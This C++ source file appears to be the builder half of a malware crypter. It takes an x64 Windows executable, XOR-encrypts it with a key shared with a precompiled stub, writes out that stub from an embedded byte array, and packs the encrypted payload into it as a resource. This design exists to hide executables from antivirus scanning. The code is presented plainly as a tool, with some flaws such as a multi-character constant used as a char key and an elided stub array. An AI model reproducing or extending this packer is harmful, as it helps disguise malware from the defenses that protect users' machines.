#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

// raw data of our compiled stub
unsigned char rawData[2462687] = { 0x4D, 0x5A, 0x90, ...};


int main(int argc, char* argv[]) {

    HANDLE hCon = GetStdHandle( STD_OUTPUT_HANDLE );   // link to console to change colors

    cout << "Checking input arguments... ";
    if (argc < 2) {
        SetConsoleTextAttribute( hCon, 4 );
        cout << "Error: Start this program with arguments." << endl;
        SetConsoleTextAttribute( hCon, 7 );
        system("pause");
        return 0;
    }
    SetConsoleTextAttribute( hCon, 2 );
    cout << "Success" << endl;
    SetConsoleTextAttribute( hCon, 7 );

    const char *resFile = argv[1];


    // read input file
    cout << "Reading input file... ";
    FILE *fileptr;
    char *fileBuff;
    long filelen;

    fileptr = fopen(resFile, "rb"); // Open the file in binary mode
    fseek(fileptr, 0, SEEK_END);    // jump to the end of the file
    filelen = ftell(fileptr);   // get the current byte offset in the file
    rewind(fileptr);    // jump back to the beginning of the file

    fileBuff = (char *)malloc(filelen * sizeof(char));  // alloc memory for the file
    fread(fileBuff, filelen, 1, fileptr);   // read in the entire file
    fclose(fileptr);

    if (fileBuff == NULL) {
        SetConsoleTextAttribute( hCon, 4 );
        cout << "Error: Could not read input file." << endl;
        SetConsoleTextAttribute( hCon, 7 );
        system("pause");
        return 0;
    }
    SetConsoleTextAttribute( hCon, 2 );
    cout << "Success" << endl;
    SetConsoleTextAttribute( hCon, 7 );


    // check if input file is a valid x64 PE
    cout << "Validate input file as x64 PE... ";
    IMAGE_DOS_HEADER* _dosHeader = 	(PIMAGE_DOS_HEADER)	fileBuff;
    IMAGE_NT_HEADERS64* _ntHeader  = 	(PIMAGE_NT_HEADERS64)(DWORD64(fileBuff) + _dosHeader->e_lfanew);
    bool is64  = _ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
    if (!is64) {
        SetConsoleTextAttribute( hCon, 4 );
        cout << "Error. Input file is not a valid x64 PE" << endl;
        SetConsoleTextAttribute( hCon, 7 );
        system("pause");
        return 0;
    }
    SetConsoleTextAttribute( hCon, 2 );
    cout << "Success" << endl;
    SetConsoleTextAttribute( hCon, 7 );


    // XOR encrypt the resource data
    cout << "Encrypting data... ";
    char key = '6741865291';    //same key as in the compiled Stub
    char encrypted[filelen];
    for (int i = 0; i < filelen; i++)
        encrypted[i] = fileBuff[i] ^ key;
    if (encrypted == NULL) {
        SetConsoleTextAttribute( hCon, 4 );
        cout << "Error: Could not encrypt the data" << endl;
        SetConsoleTextAttribute( hCon, 7 );
        system("pause");
        return 0;
    }
    SetConsoleTextAttribute( hCon, 2 );
    cout << "Success" << endl;
    SetConsoleTextAttribute( hCon, 7 );


    // write Stub
    cout << "Writing stub... ";
    fstream bin ("Stub.exe",ios :: out | ios :: binary);
    if (!bin.write(reinterpret_cast<const char *>(rawData), sizeof(rawData))) {
        SetConsoleTextAttribute( hCon, 4 );
        cout << "Error: Could not encrypt the data" << endl;
        SetConsoleTextAttribute( hCon, 7 );
        system("pause");
        return 0;
    }
    bin.close();
    SetConsoleTextAttribute( hCon, 2 );
    cout << "Success" << endl;
    SetConsoleTextAttribute( hCon, 7 );


    // add encrypted data as resource to the stub
    cout << "Write encrypted resource to stub... ";
    HANDLE hUpdateRes;
    BOOL result;

    hUpdateRes = BeginUpdateResource("Stub.exe", FALSE);
    if (hUpdateRes == NULL)
    {
        SetConsoleTextAttribute( hCon, 4 );
        cout << "Error: Could not open file for writing" << endl;
        SetConsoleTextAttribute( hCon, 7 );
        system("pause");
        return 0;
    }

    result = UpdateResource(hUpdateRes,                  // update resource handle
                            "BIN",                       // resource ID
                            MAKEINTRESOURCE(132),        // resource name
                            NULL,
                            encrypted,                   // ptr to encrypted resource
                            filelen);                    // size of resource

    if (result == FALSE)
    {
        SetConsoleTextAttribute( hCon, 4 );
        cout << "Error: Could not add resource" << endl;
        SetConsoleTextAttribute( hCon, 7 );
        system("pause");
        return 0;
    }

    // write changes and then close
    if (!EndUpdateResource(hUpdateRes, FALSE))
    {
        SetConsoleTextAttribute( hCon, 4 );
        cout << "Error: Could not write changes to file" << endl;
        SetConsoleTextAttribute( hCon, 7 );
        system("pause");
        return 0;
    }
    SetConsoleTextAttribute( hCon, 2 );
    cout << "Success" << endl;
    SetConsoleTextAttribute( hCon, 7 );
    system("pause");

    return 0;
}
